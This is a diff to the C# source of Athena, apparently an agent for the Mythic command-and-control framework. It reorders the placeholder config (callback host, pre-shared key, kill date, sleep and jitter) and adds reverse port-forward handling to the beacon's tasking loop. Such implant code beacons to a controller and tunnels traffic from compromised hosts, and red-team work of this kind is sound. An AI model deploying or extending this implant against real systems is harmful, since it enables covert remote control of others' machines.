@@ -4,13 +4,13 @@ using System.Text.Json;
 using System.Net.WebSockets;
 using System.Text;
 using Athena.Models.Mythic.Checkin;
-using System.Text.Json.Serialization;
 using System.Diagnostics;
-using Athena.Models.Athena.Commands;
-using Athena.Models.Mythic.Response;
+using Athena.Models.Commands;
 using Athena.Models.Mythic.Tasks;
 using Athena.Commands;
 using Athena.Profiles.Websocket;
+using Athena.Models.Comms.SMB;
+using Athena.Models.Proxy;
 
 namespace Athena
 {
@@ -39,18 +39,18 @@ namespace Athena
             int callbackPort = Int32.Parse("callback_port");
             string callbackHost = "callback_host";
             this.endpoint = "ENDPOINT_REPLACE";
-            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
-            this.killDate = kd;
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "USER_AGENT";
             this.hostHeader = "%HOSTHEADER%";
             this.psk = "AESPSK";
             this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
-            this.uuid = "%UUID%";
             int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
             this.sleep = sleep;
+            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.killDate = kd;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
+            this.uuid = "%UUID%";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
@@ -72,18 +72,18 @@ namespace Athena
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
-                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
-                await Task.WhenAll(responseTask, delegateTask, socksTask);
-
-                List<string> responses = await responseTask;
+                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
+                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
                 GetTasking gt = new GetTasking()
                 {
                     action = "get_tasking",
                     tasking_size = -1,
-                    delegates = await delegateTask,
-                    socks = await socksTask,
-                    responses = responses,
+                    delegates = delegateTask.Result,
+                    socks = socksTask.Result,
+                    responses = responseTask.Result,
+                    rpfwd = rpFwdTask.Result,
                 };
                 try
                 {
